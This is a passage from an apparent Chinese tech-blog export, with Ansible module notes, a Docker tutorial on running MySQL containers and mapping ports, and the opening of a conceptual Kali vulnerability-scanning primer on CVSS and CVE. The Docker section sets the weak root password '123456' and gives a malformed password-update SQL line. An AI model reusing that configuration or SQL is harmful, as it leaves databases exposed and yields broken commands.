<h4 id="shell-模块"><a href="#shell-模块" class="headerlink" title="shell 模块"></a>shell 模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible-doc -s shell</span><br><span class="line">- name: Execute commands in nodes.</span><br><span class="line"> action: shell</span><br><span class="line"> chdir # 在执⾏命令前，先cd到指定的⽬录下</span><br><span class="line"> free_form：# 要执行的linux指令</span><br><span class="line"> creates # ⽤于判断命令是否要执⾏。如果指定的⽂件(可以使⽤通配符)存在，则不执⾏。</span><br><span class="line"> removes # ⽤于判断命令是否要执⾏。如果指定的⽂件(可以使⽤通配符)不存在，则不执⾏。</span><br><span class="line"> executable # 不再使⽤默认的/bin/sh解析并执⾏命令，⽽是使⽤此处指定的命令解析。</span><br><span class="line"> # 例如使⽤expect解析expect脚本。必须为绝对路径。</span><br></pre></td></tr></table></figure>
<h4 id="copy、template-模块"><a href="#copy、template-模块" class="headerlink" title="copy、template 模块"></a>copy、template 模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible-doc -s copy</span><br><span class="line">- name: Copies files to remote locations.</span><br><span class="line">action: copy</span><br><span class="line"> backup=[yes|no] # 拷贝的同时也创建⼀个包含时间戳信息的备份⽂件，默认为no</span><br><span class="line"> dest= # ⽬标路径，只能是绝对路径，如果拷贝的⽂件是⽬录，则⽬标路径必须也是⽬录</span><br><span class="line"> content # 直接以content给定的字符串或变量值作为⽂件内容保存到远程主机上，它会替代src选项</span><br><span class="line"> directory_mode # 当对⽬录做递归拷贝时，设置了directory_mode将会使得只拷贝新建⽂件，</span><br><span class="line"> # 旧⽂件不会被拷贝。默认未设置</span><br><span class="line"> follow=[yes|no] # 是否追踪到链接的源⽂件。</span><br><span class="line"> force=[yes|no] # 设置为yes(默认)时，将覆盖远程同名⽂件。设置为no时，忽略同名⽂件的拷贝。</span><br><span class="line"> group # 设置远程⽂件的所属组</span><br><span class="line"> owner # 设置远程⽂件的所有者</span><br><span class="line"> mode= # 设置远程⽂件的权限。使⽤数值表⽰时不能省略第⼀位，如0644。</span><br><span class="line"> # 也可以使⽤&apos;u+rwx&apos;或&apos;u=rw,g=r,o=r&apos;等⽅式设置。</span><br><span class="line"> src= # 拷贝本地源⽂件到远程，可使⽤绝对路径或相对路径。如果路径是⽬录，且 ⽬录后加了斜杠&quot;/&quot;，则只会拷贝⽬录中的内容到远程，如果 ⽬录后不加斜杠，则拷贝⽬录本⾝和⽬录内的内容到远程。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ansible-doc -s template</span><br><span class="line">- name: Templates a file out to a remote server.</span><br><span class="line">action: template</span><br><span class="line"> backup # 拷贝的同时也创建⼀个包含时间戳信息的备份⽂件，默认为no</span><br><span class="line"> dest= # ⽬标路径</span><br><span class="line"> force # 设置为yes (默认)时，将覆盖远程同名⽂件。设置为no时，忽略同名⽂件的拷贝</span><br><span class="line"> group # 设置远程⽂件的所属组</span><br><span class="line"> owner # 设置远程⽂件的所有者</span><br><span class="line"> mode # 设置远程⽂件的权限。使⽤数值表⽰时不能省略第⼀位，如0644。</span><br><span class="line"> # 也可以使⽤&apos;u+rwx&apos; or &apos;u=rw,g=r,o=r&apos;等⽅式设置</span><br><span class="line"> src= # ansible控制器上Jinja2格式的模板所在位置，可以是相对或绝对路径</span><br><span class="line"> validate # 在复制到⽬标主机后但放到⽬标位置之前，执⾏此选项指定的命令。</span><br><span class="line"> # ⼀般⽤于检查配置⽂件语法，语法正确则保存到⽬标位置。</span><br><span class="line"> # 如果要引⽤⽬标⽂件名，则使⽤%s，下⾯的⽰例中的s%即表⽰⽬标机器上的/etc/nginx/nginx.conf。</span><br></pre></td></tr></table></figure>
<h4 id="file-模块"><a href="#file-模块" class="headerlink" title="file 模块"></a>file 模块</h4><h4 id="fetch拉取⽂件模块"><a href="#fetch拉取⽂件模块" class="headerlink" title="fetch拉取⽂件模块"></a>fetch拉取⽂件模块</h4><h4 id="rsync模块synchronize"><a href="#rsync模块synchronize" class="headerlink" title="rsync模块synchronize"></a>rsync模块synchronize</h4><h4 id="包管理模块yum"><a href="#包管理模块yum" class="headerlink" title="包管理模块yum"></a>包管理模块yum</h4><h4 id="配置yum源模块yum-repository"><a href="#配置yum源模块yum-repository" class="headerlink" title="配置yum源模块yum_repository"></a>配置yum源模块yum_repository</h4><h4 id="服务管理模块service"><a href="#服务管理模块service" class="headerlink" title="服务管理模块service"></a>服务管理模块service</h4><h4 id="systemd模块"><a href="#systemd模块" class="headerlink" title="systemd模块"></a>systemd模块</h4><h4 id="⽤户管理模块user"><a href="#⽤户管理模块user" class="headerlink" title="⽤户管理模块user"></a>⽤户管理模块user</h4><h4 id="authorzied-key模块"><a href="#authorzied-key模块" class="headerlink" title="authorzied_key模块"></a>authorzied_key模块</h4><h4 id="debug模块"><a href="#debug模块" class="headerlink" title="debug模块"></a>debug模块</h4><h4 id="定时任务模块cron"><a href="#定时任务模块cron" class="headerlink" title="定时任务模块cron"></a>定时任务模块cron</h4><h4 id="归档模块archive"><a href="#归档模块archive" class="headerlink" title="归档模块archive"></a>归档模块archive</h4><h4 id="解包模块unarchive"><a href="#解包模块unarchive" class="headerlink" title="解包模块unarchive"></a>解包模块unarchive</h4><h4 id="wait-for模块"><a href="#wait-for模块" class="headerlink" title="wait_for模块"></a>wait_for模块</h4><h4 id="script模块"><a href="#script模块" class="headerlink" title="script模块"></a>script模块</h4><h3 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h3><h4 id="列表、字典、分行写"><a href="#列表、字典、分行写" class="headerlink" title="列表、字典、分行写"></a>列表、字典、分行写</h4><h4 id="向模块传递参数"><a href="#向模块传递参数" class="headerlink" title="向模块传递参数"></a>向模块传递参数</h4><p>3 种方式：<br>1、直接卸载模块后面<br>2、直接携程字典形式<br>3、使用内置属性 args</p>
<h4 id="什么时候使用引号"><a href="#什么时候使用引号" class="headerlink" title="什么时候使用引号"></a>什么时候使用引号</h4><h4 id="remote-user"><a href="#remote-user" class="headerlink" title="remote_user"></a>remote_user</h4><p>remote_user实际上并不是执⾏任务的绝对⾝份，它只是ssh连接过去的⾝份，只不过没有<br>指定become的时候，它正好就⽤此⾝份来运⾏任务。</p>
<h4 id="notify和handler"><a href="#notify和handler" class="headerlink" title="notify和handler"></a>notify和handler</h4><p>执⾏ task 任务时，如果捕捉到 changed=true，那么就会触发notify，notify下定义了待调⽤的handler。</p>
<p>handler 的定义和 tasks 的定义完全⼀样，唯⼀需要限定的是 handler 中 task 的 name 必须和 notify 中定义的名称相同。</p>
<p>notify 是在<strong>执⾏完⼀个 play 中所有 task 后</strong>被触发的，在⼀个 play 中也只会被触发⼀次。意味着如果⼀个 play 中有多个 task 出现了 changed=true，它也只会触发⼀次。</p>
<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>可以为 playbook 中的每个任务都打上标签，标签的主要作⽤是可以在 ansible-playbook 中设置只执⾏哪些被打上 tag 的任务或忽略被打上 tag 的任务。</p>
<h4 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h4><p>with_items迭代列表<br>with_dict迭代字典项<br>with_fileglob迭代⽂件<br>with_nested嵌套迭代</p>
<h4 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h4><p>逻辑或、逻辑与、取反</p>
<p>直接引⽤布尔值的变量、可以使⽤jinja2的def ined来测试变量是否已定义，使⽤undef ined可以取反表⽰未定义。</p>
<h3 id="CMDB"><a href="#CMDB" class="headerlink" title="CMDB"></a>CMDB</h3>]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>Linux</tag>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker初识</title>
    <url>/Docker%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h2 id="Docker-入门"><a href="#Docker-入门" class="headerlink" title="Docker 入门"></a>Docker 入门</h2><p>Docker解决的是服务器应用快速构建、部署和分享的问题，他能将服务器应用像APP一样简单地部署到各种平台环境中，而不受真实环境的影响。</p>
<p>与Hadoop区别：解决的是分布式计算问题，他提供一套分布式存储和计算的解决方案，而且这个方案很廉价很高效。</p>
<h3 id="三个核心概念：容器、镜像、Docker-Hub"><a href="#三个核心概念：容器、镜像、Docker-Hub" class="headerlink" title="三个核心概念：容器、镜像、Docker Hub"></a>三个核心概念：容器、镜像、Docker Hub</h3><p>容器：提供一个隔离的安全运行环境，是的不同应用质检不会互相干扰。</p>
<p>镜像：容器的静态存在方式。<br><a id="more"></a><br>Docker Hub：一个公共的镜像平台，为镜像分享提供便利。用户可以根据自己的需要，在已有镜像的基础上定制自己的镜像。</p>
<h3 id="Docker通俗介绍"><a href="#Docker通俗介绍" class="headerlink" title="Docker通俗介绍"></a>Docker通俗介绍</h3><p>Docker就像一个打包器，可以把你的应用及其环境整体打包，然后很方便地迁移到不同的平台，到处运行。</p>
<h3 id="当一个应用拥有复杂的软件依赖关系和多种多样的硬件运行环境和多样的硬件运行环境时，有以下几个问题必须面对："><a href="#当一个应用拥有复杂的软件依赖关系和多种多样的硬件运行环境和多样的硬件运行环境时，有以下几个问题必须面对：" class="headerlink" title="当一个应用拥有复杂的软件依赖关系和多种多样的硬件运行环境和多样的硬件运行环境时，有以下几个问题必须面对："></a>当一个应用拥有复杂的软件依赖关系和多种多样的硬件运行环境和多样的硬件运行环境时，有以下几个问题必须面对：</h3><p>能否处理应用依赖的多样性和依赖库之间的不良反应？<br>能否能够适应硬件环境的多样性？<br>服务和应用之间的交互是否合理？<br>是否可以在多个平台之间快捷移动？</p>
<h3 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h3><p>Docker容器引擎；该引擎可以让开发者打包他们的应用和依赖包到任何一个可一直的容器中，然后将其发布到任何流行的Linux机器上。<br>Docker Hub注册服务器：用户可以在该服务器上创建自己的镜像来存储、管理和分享镜像。利用Docker，可实现软件的一次配置、处处运行。</p>
<h4 id="容器与虚拟机"><a href="#容器与虚拟机" class="headerlink" title="容器与虚拟机"></a>容器与虚拟机</h4><p>虚拟机不陌生，基于硬件的虚拟技术，指令级的虚拟，完全虚拟一套物理主机。<br>Docker：进程级别的隔离，让每个容器都想运行在单独的系统之上，但又能狗共享很多底层资源。轻量、快速、易于管理。</p>
<h3 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h3><p>本文开发环境为Ubuntu 16.04 LTS 64位系统，通过apt的docker官方源安装最新的Docker CE(Community Edition)，即Docker社区版，是开发人员和小型团队的理想选择。</p>
<p>开始安装</p>
<p>由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本：</p>
<pre><code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></pre>

<p>更新apt包索引：</p>
<pre><code>$ sudo apt-get update</code></pre>

<p>安装以下包以使apt可以通过HTTPS使用存储库（repository）：</p>
<pre><code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></pre>

<p>添加Docker官方的GPG密钥：</p>
<pre><code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - </code></pre>

<p>使用下面的命令来设置stable存储库：</p>
<pre><code>$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code></pre>

<p>再更新一下apt包索引：</p>
<pre><code>$ sudo apt-get update</code></pre>

<p>安装最新版本的Docker CE：</p>
<pre><code>$ sudo apt-get install -y docker-ce</code></pre>

<p>在生产系统上，可能会需要应该安装一个特定版本的Docker CE，而不是总是使用最新版本：<br>列出可用的版本：</p>
<pre><code>$ apt-cache madison docker-ce</code></pre>

<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-f9bb3727a2acab4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>选择要安装的特定版本，第二列是版本字符串，第三列是存储库名称，它指示包来自哪个存储库，以及扩展它的稳定性级别。要安装一个特定的版本，将版本字符串附加到包名中，并通过等号(=)分隔它们：</p>
<pre><code>$ sudo apt-get install docker-ce=18.03.1~ce-0~ubuntu</code></pre>
验证docker

查看docker服务是否启动：
<pre><code>$ systemctl status docker</code></pre>

<p>若未启动，则启动docker服务：</p>
<pre><code>$ sudo systemctl start docker</code></pre>

<p>经典的hello world：</p>
<pre><code>$ sudo docker run hello-world</code></pre>

<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-80e0777ddba53777.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>有以上输出则证明docker已安装成功！</p>
<p>获取mysql官方最新docker镜像</p>
<pre><code>$ sudo docker pull mysql/mysql-server:latest</code></pre>

<p>耐心等待下载，完成后可以通过以下命令查看下载的镜像：</p>
<pre><code>$ sudo docker images</code></pre>

<h3 id="创建并启动mysql服务容器"><a href="#创建并启动mysql服务容器" class="headerlink" title="创建并启动mysql服务容器"></a>创建并启动mysql服务容器</h3><h4 id="创建一个文件夹用于挂载mysql数据库文件"><a href="#创建一个文件夹用于挂载mysql数据库文件" class="headerlink" title="创建一个文件夹用于挂载mysql数据库文件"></a>创建一个文件夹用于挂载mysql数据库文件</h4><pre><code>$ sudo mkdir /docker/mysql_data -p</code></pre>

<h4 id="生成mysql容器"><a href="#生成mysql容器" class="headerlink" title="生成mysql容器"></a>生成mysql容器</h4><pre><code>$ sudo docker run --name mysql -d --restart always -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -v /docker/mysql_data:/var/lib/mysql mysql/mysql-server</code></pre>

<p>其中，–name mysql：容器指定名称为mysql；-d：后台运行容器，并返回容器ID；–restart always：在容器退出时总是重启容器；-p 3306:3306：将宿主机的3306端口（前者）映射到容器的3306端口（后者）；-e MYSQL_ROOT_PASSWORD=123456：设置mysql的root密码为123456；-v /docker/mysql_data:/var/lib/mysql：将宿主机的目录/docker/mysql_data映射到容器的目录/var/lib/mysql，用于存放容器的mysql数据库文件。</p>
<h4 id="查看容器启动状态"><a href="#查看容器启动状态" class="headerlink" title="查看容器启动状态"></a>查看容器启动状态</h4><p>查看已经创建的容器：</p>
<pre><code>$ sudo docker ps -a</code></pre>

<p>查看已经启动的容器：</p>
<pre><code>$ sudo docker ps -s</code></pre>

<p>若容器未启动，则通过以下命令启动：</p>
<pre><code>$ sudo docker start mysql</code></pre>


<p>其中mysql是容器名称，也可以使用CONTAINER ID（见下图）代替，如81f7c15f9415</p>
<h4 id="docker容器下命令行连接mysql数据库"><a href="#docker容器下命令行连接mysql数据库" class="headerlink" title="docker容器下命令行连接mysql数据库"></a>docker容器下命令行连接mysql数据库</h4><p>首先进入mysql容器的bash终端：</p>
<pre><code>$ sudo docker exec -it mysql bash</code></pre>

<p>连接mysql：</p>
<pre><code>$ mysql -u root -p</code></pre>

<p>输入步骤2.2设置的mysql root密码，之后就可以自由操作mysql了！</p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-53d453d8ce994e7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h4 id="通过宿主机命令行连接mysql"><a href="#通过宿主机命令行连接mysql" class="headerlink" title="通过宿主机命令行连接mysql"></a>通过宿主机命令行连接mysql</h4><p>首先在宿主机上安装mysql客户端：</p>
<pre><code>$ sudo apt-get install -y mysql-client</code></pre>

<p>尝试连接：</p>
<pre><code>$ mysql -h 127.0.0.1 -u root -p</code></pre>

<p>输入密码后显然是连接不上的：</p>
<p>先通过步骤2.4连接到mysql，之后添加数据库test，针对此库添加用户testuser，密码是123456先通过步骤2.4连接到mysql，之后添加数据库test，针对此库添加用户testuser，密码是123456</p>
<pre><code>CREATE DATABASE test;
GRANT ALL PRIVILEGES ON test.* TO testuser@172.17.0.1 IDENTIFIED BY '123456';
FLUSH PRIVILEGES;</code></pre>

<p>然后就可以在宿主机上连接mysql数据库了：</p>
<pre><code>$ mysql -h 127.0.0.1 -u testuser -p</code></pre>

<h4 id="docker容器修改mysql密码"><a href="#docker容器修改mysql密码" class="headerlink" title="docker容器修改mysql密码"></a>docker容器修改mysql密码</h4><p>1.进入 mysql 容器</p>
<p><code>docker exec -it mysql /bin/bash</code></p>
<p>2.修改mysql容器的配置文件</p>
<p>打开配置文件的命令<br><code>vi /etc/mysql/my.cnf</code><br>在最后一行添加如下代码( //跳过mysql的密码验证)<br><code>skip-grant-tables</code></p>
<p>3.重启mysql容器</p>
<p><code>docker restart mysql</code></p>
<p>4.重新进入容器输入命令root为用户名<br><code>mysql -u root -p</code></p>
<p>5.修改密码的命令<br><code>update mysql.user set passwrd=“新密码” where &#39;&#39;User&quot; = “username”;</code></p>
<h3 id="加速镜像"><a href="#加速镜像" class="headerlink" title="加速镜像"></a>加速镜像</h3><p><a href="https://c.163yun.com/hub" target="_blank" rel="noopener">网易蜂巢 hub 镜像</a></p>
<p>阿里云加速</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）在阿里云申请自己的Docker镜像加速地址</span><br><span class="line"></span><br><span class="line">阿里云镜像加速申请  https://cr.console.aliyun.com/cn-qingdao/mirrors</span><br><span class="line"></span><br><span class="line">（2）配置Docker镜像加速</span><br><span class="line"></span><br><span class="line">　　1.编辑daemon.json文件，添加加速配置</span><br><span class="line"></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;,&quot;https://kxv08zer.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">　　2.重载所有修改过的配置文件</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">　　3.重新启动Docker服务</span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="Docker-给运行中的容器设置端口映射的方法"><a href="#Docker-给运行中的容器设置端口映射的方法" class="headerlink" title="Docker 给运行中的容器设置端口映射的方法"></a>Docker 给运行中的容器设置端口映射的方法</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>Docker 端口映射即映射容器内应用的服务端口到本机宿主机器。</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>当容器中运行一些网络应用，要让外部访问这些应用时，可以通过 -P 或 -p 参数两种方式来指定端口映射。</p>
<h5 id="随机映射"><a href="#随机映射" class="headerlink" title="随机映射"></a>随机映射</h5><p>使用 -P 参数时，Docker 会随机映射一个端口到内部容器开放的网络端口，如下开启一个 nginx 服务：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -d -P nginx</span><br><span class="line">e93349d539119dc48dc841e117f6388d6afa6a6065b75a5b4aedaf5fb2a051fc</span><br><span class="line">$</span><br><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES</span><br><span class="line">e93349d53911 nginx “nginx -g &apos;daemon …” 11 seconds ago Up 9 seconds 0.0.0.0:32769-&gt;80/tcp zen_kirch</span><br></pre></td></tr></table></figure></p>
<p>使用 docker ps 看到，本地主机的 32769 端口被映射到了容器的 80 端口，这时我们通过本机浏览器访问 <a href="http://localhost:32769" target="_blank" rel="noopener">http://localhost:32769</a> 就会出现 nginx 欢迎页面。</p>
<h5 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h5><p>使用 -p 参数时，可以指定要映射的端口，并且在一个指定的端口上只可以绑定一个容器。支持的格式有：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IP:HostPort:ContainerPort</span><br><span class="line">IP:ContainerPort</span><br><span class="line">HostPort:ContainerPort</span><br><span class="line">下面开启一个 nginx 服务，将本机 8080 端口映射到容器的 80 端口：</span><br><span class="line"></span><br><span class="line">$ docker run -d -p 8080:80 nginx</span><br><span class="line">23e725098712d061a1382f33d6fe54da23ae37597a62f8debdd3731b5f9cc4b9</span><br><span class="line">$</span><br><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES</span><br><span class="line">23e725098712 nginx “nginx -g &apos;daemon …” 8 seconds ago Up 6 seconds 0.0.0.0:8080-&gt;80/tcp frosty_ptolemy</span><br></pre></td></tr></table></figure></p>
<p>使用 docker ps 看到，本地主机的 8080 端口被映射到了容器的 80 端口，这时我们通过本机浏览器访问 <a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a> 就会出现 nginx 欢迎页面。</p>
<h4 id="查看映射端口"><a href="#查看映射端口" class="headerlink" title="查看映射端口"></a>查看映射端口</h4><p>使用 docker port 命令来查看当前映射的端口配置，也可以查看到绑定的地址。命令格式如下：</p>
<p><code>$ docker port CONTAINER [PRIVATE_PORT[/PROTO]]</code><br>容器有自己的内部网络和 IP 地址，可以使用 docker inspect + 容器ID 获取容器的具体信息。</p>
<p>DOCKER 给运行中的容器添加映射端口</p>
<h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>1、获得容器IP</p>
<p>将container_name 换成实际环境中的容器名<br><code>docker inspect container_name | grep IPAddress</code><br>2、 iptable转发端口</p>
<p>将容器的8000端口映射到docker主机的8001端口<br>复制代码 代码如下:</p>
<p><code>iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination 172.17.0.19:8000</code></p>
<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>1.提交一个运行中的容器为镜像</p>
<p><code>docker commit containerid foo/live</code><br>2.运行镜像并添加端口</p>
<p><code>docker run -d -p 8000:80 foo/live /bin/bash</code></p>
<h3 id="docker容器启动后怎么修改端口映射"><a href="#docker容器启动后怎么修改端口映射" class="headerlink" title="docker容器启动后怎么修改端口映射"></a>docker容器启动后怎么修改端口映射</h3><p>docker容器启动后怎么修改端口映射？在docker run创建并运行容器的时候，可以通过-p指定端口映射规则。但是，也会遇到刚开始忘记设置端口映射或者设置错了需要修改的情况。当docker start运行容器后，并没有提供一个-p选项或设置，让你修改指定端口映射规则。</p>
<p>通常间接的办法是，保存镜像，再创建一个新的容器，在创建时指定新的端口映射。</p>
<h4 id="方法一：删除原有容器，重新建新容器"><a href="#方法一：删除原有容器，重新建新容器" class="headerlink" title="方法一：删除原有容器，重新建新容器"></a>方法一：删除原有容器，重新建新容器</h4><p>这个解决方案最为简单，把原来的容器删掉，重新建一个。当然这次不要忘记加上端口映射。优点是简单快捷，在测试环境使用较多。缺点是如果是数据库镜像，那重新建一个又要重新配置一次，就比较麻烦了。</p>
<h4 id="方法二：利用docker-commit新构镜像"><a href="#方法二：利用docker-commit新构镜像" class="headerlink" title="方法二：利用docker commit新构镜像"></a>方法二：利用docker commit新构镜像</h4><p>docker commit：把一个容器的文件改动和配置信息commit到一个新的镜像。这个在测试的时候会非常有用，把容器所有的文件改动和配置信息导入成一个新的docker镜像，然后用这个新的镜像重起一个容器，这对之前的容器不会有任何影响。</p>
<p>1、停止docker容器</p>
<p><code>docker stop container01</code></p>
<p>2、commit该docker容器</p>
<p><code>docker commit container01 new_image:tag</code></p>
<p>3、用前一步新生成的镜像重新起一个容器</p>
<p><code>docker run --name container02 -p 80:80 new_image:tag</code></p>
<p>这种方式的优点是不会影响统一宿主机上的其他容器，缺点是管理起来显得比较乱。</p>
<h4 id="方法三：修改文件端口，重启docker服务"><a href="#方法三：修改文件端口，重启docker服务" class="headerlink" title="方法三：修改文件端口，重启docker服务"></a>方法三：修改文件端口，重启docker服务</h4><p>1、停止容器(<code>docker stop d00254ce3af7</code>)</p>
<p>2、停止docker服务(<code>systemctl stop docker</code>)</p>
<p>3、修改这个容器的hostconfig.json文件中的端口（如果config.v2.json里面也记录了端口，也要修改）</p>
<p><code>cd /var/lib/docker/containers/d00254ce3af7* #这里是CONTAINER ID</code></p>
<p><code>vim hostconfig.json</code><br>如果之前没有端口映射, 应该有这样的一段:<br><code>&quot;PortBindings&quot;:{}</code></p>
<p>增加一个映射, 这样写:<br><code>&quot;PortBindings&quot;:{&quot;8080/tcp&quot;:[{&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;60000&quot;}]}</code><br>前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口<br>而修改现有端口映射更简单, 把端口号改掉就行。<br>4、启动docker服务(<code>systemctl start docker</code>)</p>
<p>5、启动容器(<code>docker start d00254ce3af7</code>)</p>
<h2 id="Docker-进阶"><a href="#Docker-进阶" class="headerlink" title="Docker 进阶"></a>Docker 进阶</h2><h3 id="Docker-Compose-详解"><a href="#Docker-Compose-详解" class="headerlink" title="Docker Compose 详解"></a>Docker Compose 详解</h3>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-linux漏洞扫描入门</title>
    <url>/Kali-linux%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><ul>
<li>基于端口服务扫描结果版本信息（速度慢）</li>
<li>搜索已公开的漏洞数据库（数量大）</li>
<li>使用弱点扫描器实现漏洞管理<a id="more"></a>
<h2 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3></li>
<li>扫描发现网络IP、OS、服务、配置、漏洞</li>
<li>能力需求：定义扫描方式内容和目标<h3 id="信息管理"><a href="#信息管理" class="headerlink" title="信息管理"></a>信息管理</h3></li>
<li>格式化信息，并进行筛选、分组、定义优先级</li>
<li>能力需求：资产分组、指定所有者、向所有者报告漏洞<h3 id="信息输出"><a href="#信息输出" class="headerlink" title="信息输出"></a>信息输出</h3></li>
<li>向不同层级的人群展示足够的信息量</li>
<li>能力需求：生成报告、导出数据、与SIEM集成</li>
</ul>
<h2 id="弱点扫描类型"><a href="#弱点扫描类型" class="headerlink" title="弱点扫描类型"></a>弱点扫描类型</h2><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><ul>
<li>有身份验证</li>
<li>无身份验证<h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3></li>
<li>镜像端口抓包</li>
<li>其他来源输入<h3 id="基于Agent的扫描"><a href="#基于Agent的扫描" class="headerlink" title="基于Agent的扫描"></a>基于Agent的扫描</h3></li>
<li>支持平台有限</li>
</ul>
<h2 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h2><h3 id="CVSS（Common-Vulnerability-Scoring-System）"><a href="#CVSS（Common-Vulnerability-Scoring-System）" class="headerlink" title="CVSS（Common Vulnerability Scoring System）"></a>CVSS（Common Vulnerability Scoring System）</h3><ul>
<li>通用漏洞评分系统——工业标准</li>
<li>描述安全漏洞严重程度的统一评分方案</li>
<li>V 3版本——2015年6月10日</li>
<li>Basic Metric：基础的恒定不变的弱点权重</li>
<li>Temporal Metric：依赖时间因素的弱点权重</li>
<li>Enviromental Metric：利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议（SCAP）的一部分</li>
<li>通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新</li>
<li>分值范围：0 —— 10</li>
<li>不同机构按CVSS分值定义威胁的中、高、低威胁级别</li>
<li>CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度</li>
<li>CVSS分值是工业标准，但威胁级别不是<h3 id="Vulnerability-Reference"><a href="#Vulnerability-Reference" class="headerlink" title="Vulnerability Reference"></a>Vulnerability Reference</h3><h3 id="CVE（-Common-Vulnerabilities-and-Exposures-）"><a href="#CVE（-Common-Vulnerabilities-and-Exposures-）" class="headerlink" title="CVE（ Common Vulnerabilities and Exposures ）"></a>CVE（ Common Vulnerabilities and Exposures ）</h3></li>
<li>已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
<li>MITRE公司负责维护（非盈利机构）</li>
<li>扫描器的大部分扫描项都对应一个CVE编号</li>
<li>实现不同厂商之间信息交换的统一标准</li>
<li>CVE发布流程</li>
<li>发现漏洞</li>
<li>CAN负责指定CVE ID</li>
<li>发布到CVE List —— CVE-2008-4250</li>
<li>MITRE负责对内容进行编辑维护</li>
</ul>
<h3 id="很多厂商维护自己的Vulnerability-Reference"><a href="#很多厂商维护自己的Vulnerability-Reference" class="headerlink" title="很多厂商维护自己的Vulnerability Reference"></a>很多厂商维护自己的Vulnerability Reference</h3><ul>
<li>MS –微软</li>
<li>MSKB  – 补丁</li>
<li>其他Vulnerability Reference</li>
<li><ul>
<li>CERT TA08-297A</li>
</ul>
</li>
<li>BID 31874</li>
<li>IAVM 2008-A-0081</li>
<li>OVAL OVAL6093</li>
</ul>
<h4 id="OVAL（Open-Vulnerability-and-Assessment-Language）"><a href="#OVAL（Open-Vulnerability-and-Assessment-Language）" class="headerlink" title="OVAL（Open Vulnerability and Assessment Language）"></a>OVAL（Open Vulnerability and Assessment Language）</h4><ul>
<li>描述漏洞检测方法的机器可识别语言</li>
<li>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</li>
<li>OVAL使用XML语言描述，包含了严密的语法逻辑<h4 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a>CCE</h4></li>
<li>描述软件配置缺陷的一种标准化格式</li>
